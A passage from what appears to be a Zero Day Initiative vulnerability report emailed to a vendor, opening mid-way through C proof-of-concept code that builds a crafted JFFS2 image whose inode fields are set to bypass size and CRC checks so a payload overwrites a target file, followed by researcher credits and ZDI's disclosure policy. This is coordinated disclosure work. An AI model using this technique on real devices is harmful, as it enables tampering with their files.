        fwrite(&dirent,1,sizeof(dirent),fp);
        fwrite(TARGET_FILENAME,1,strlen(TARGET_FILENAME),fp);
        fwrite(&padding,1,sizeof(padding),fp);
        Jffs2_raw_inode inode;
        inode.magic =3D JFFS2_MAGIC_BITMASK;
        inode.nodetype =3D JFFS2_NODETYPE_INODE;
        inode.totlen =3D sizeof(inode)+sizeof(PAYLOAD)-1;
        inode.hdr_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_unknown=
_node)-4);
        inode.ino =3D 2;
        inode.version =3D 1;
        inode.mode =3D 0x81A4;
        inode.uid =3D 0;
        inode.gid =3D 0;
        inode.isize =3D 0xFFFFFFFF; //bypass size limit
        inode.atime =3D 0;
        inode.mtime =3D 0;
        inode.ctime =3D 0;
        inode.offset =3D TARGET_OFFSET;
        inode.csize =3D 0; //bypass crc32 check
        inode.dsize =3D TARGET_LENGTH;
        inode.compr =3D 0;
        inode.usercompr =3D 0;
        inode.flags =3D 0;
        inode.data_crc =3D 0; //bypass crc32 check
        inode.node_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_raw_in=
ode)-8);
        fwrite(&inode,1,sizeof(inode),fp);
        fwrite(&PAYLOAD,1,sizeof(PAYLOAD)-1,fp);
        fwrite(&padding,1,sizeof(padding),fp);
        fclose(fp);
        return 0;
}
```


-- CREDIT ---------------------------------------
This vulnerability was discovered by:
Aaron Luo and Spencer Hsieh of VicOne

-- FURTHER DETAILS ------------------------------

Supporting files:


If supporting files were contained with this report they are provided withi=
n a password protected ZIP file. The password is the ZDI candidate number i=
n the form: ZDI-CAN-XXXX where XXXX is the ID number.

Please confirm receipt of this report. We expect all vendors to remediate Z=
DI vulnerabilities within 120 days of the reported date. If you are ready t=
o release a patch at any point leading up to the deadline, please coordinat=
e with us so that we may release our advisory detailing the issue. If the 1=
20-day deadline is reached and no patch has been made available we will rel=
ease a limited public advisory with our own mitigations, so that the public=
 can protect themselves in the absence of a patch. Please keep us updated r=
egarding the status of this issue and feel free to contact us at any time:

Zero Day Initiative
zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from:

  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

-- INFORMATION ABOUT THE ZDI -------------------- Established by TippingPoi=
nt and acquired by Trend Micro, the Zero Day Initiative (ZDI) neither re-se=
lls vulnerability details nor exploit code. Instead, upon notifying the aff=
ected product vendor, the ZDI provides its Trend Micro TippingPoint custome=
rs with zero day protection through its intrusion prevention technology. Ex=
plicit details regarding the specifics of the vulnerability are not exposed=
 to any parties until an official vendor patch is publicly available.

Please contact us for further details or refer to:

  http://www.zerodayinitiative.com

-- DISCLOSURE POLICY ----------------------------

Our vulnerability disclosure policy is available online at:

  http://www.zerodayinitiative.com/advisories/disclosure_policy/

TREND MICRO EMAIL NOTICE

The information contained in this email and any attachments is confidential=
 and may be subject to copyright or other intellectual property protection.=
 If you are not the intended recipient, you are not authorized to use or di=
sclose this information, and we request that you notify us by reply mail or=
 telephone and delete the original message from your mail system.

For details about what personal information we collect and why, please see =
our Privacy Notice on our website at: Read privacy policy<http://www.trendm=
icro.com/privacy>
